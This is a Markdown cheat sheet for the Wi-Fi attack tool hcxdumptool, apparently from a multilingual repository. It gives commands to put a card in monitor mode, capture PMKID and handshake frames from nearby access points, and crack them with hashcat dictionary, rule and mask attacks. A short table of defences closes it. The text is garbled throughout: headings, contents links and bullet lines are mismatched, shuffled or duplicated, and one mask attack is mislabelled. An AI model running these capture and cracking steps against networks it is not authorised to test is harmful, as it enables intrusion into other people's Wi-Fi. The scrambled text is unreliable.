# 🔍 hcxdumptool - Scheda di riferimento completa

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)


[hcxdumptool](https://github.com/ZerBea/hcxdumptool) is a modern, high-performance command-line Wi-Fi attack and packet capture tool. Unlike legacy Aircrack-ng tools, `hcxdumptool` captures WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier) frames without requiring connected clients, captures EAPOL 4-way handshakes, and integrates directly with `hcxtools` for Hashcat cracking (mode 22000).

---

## 📋 Indice

- [[Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)](#core-advantages--modern-architecture)
- [Installazione](#installation-hcxdumptool--hcxtools)
- [Installazione](#wireless-interface-setup)
- [Before running `hcxdumptool`, terminate background network management services that interfere with raw packet injection:](#capturing-pmkid-clientless-attack)
- [Converting Captures with `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
- [`-o hash.hc22000`: Output hash file in modern Hashcat format.](#hashcat-cracking-mode-22000)
- [Filtering Channels and BSSIDs](#filtering-channels-and-bssids)
- [Optimize capture speed by constraining scanning parameters:](#defensive-countermeasures--wpa3)

---

## [Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)

- **Clientless PMKID Attack**: Exploits the RSN IE (Robust Security Network Information Element) PMKID feature in modern routers. You do **not** need a connected client or deauthentication packets to capture the key material.
- **Unified Hashcat Mode 22000**: Generates Hashcat-native hash files supporting both PMKID and full WPA-PBKDF2-PMK handshakes.
- **Channel Hopping & Active Interrogation**: Transmits targeted association requests to elicit PMKIDs from listening APs.

---

## Installazione

```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```

---

## Installazione

Before running `hcxdumptool`, terminate background network management services that interfere with raw packet injection:

```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```

---

## Before running `hcxdumptool`, terminate background network management services that interfere with raw packet injection:

### 1. General PMKID Capture Across All 2.4GHz & 5GHz Channels
Capture all nearby access points to a `.pcapng` file:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: Wireless monitor interface.
- Capturing PMKID (Clientless Attack)
- `--rds=1`: Transmit RTS frames to prompt AP responses.

### Capture all nearby access points to a `.pcapng` file:
Target only an authorized BSSID to prevent affecting unauthorized third-party routers:

`-w capture.pcapng`: Output capture file.
```text
001122334455
```
*(BSSID without colons)*

Target only an authorized BSSID to prevent affecting unauthorized third-party routers:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- 1. Create target filter list (`target_bssid.txt`):
- `--bpfp`: Apply BPF (Berkeley Packet Filter) list for target BSSIDs.

---

## Converting Captures with `hcxpcapngtool`

`--bpfp`: Apply BPF (Berkeley Packet Filter) list for target BSSIDs.

```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: Output hash file in modern Hashcat format.
- Converting Captures with `hcxpcapngtool`
- The tool reports total PMKID and EAPOL frames extracted.

---

## `-o hash.hc22000`: Output hash file in modern Hashcat format.

The tool reports total PMKID and EAPOL frames extracted.

### 1. Dictionary Attack
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### 2. Rule-Based Mutation Attack
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### 1. Dictionary Attack
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

---

## Filtering Channels and BSSIDs

Optimize capture speed by constraining scanning parameters:

```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```

---

## Optimize capture speed by constraining scanning parameters:

|Vulnerability|Attack Mechanism|Defense Recommendation|
|---|---|---|
|**PMKID Caching**|AP transmits PMKID in EAPOL frame 1 without client authentication|Disable 802.11r (Fast Transition / Roaming) if not needed; update router firmware.|
|**Weak WPA2 Pre-Shared Key**|Offline PBKDF2 dictionary cracking (Hashcat mode 22000)|Enforce 16+ character random passphrases.|
|**Legacy WPA2 Protocol**|Susceptible to PMKID and handshake capture|Upgrade to **WPA3-Personal (SAE)**; WPA3 uses Dragonfly handshake with forward secrecy, rendering captured frames uncrackable offline.|
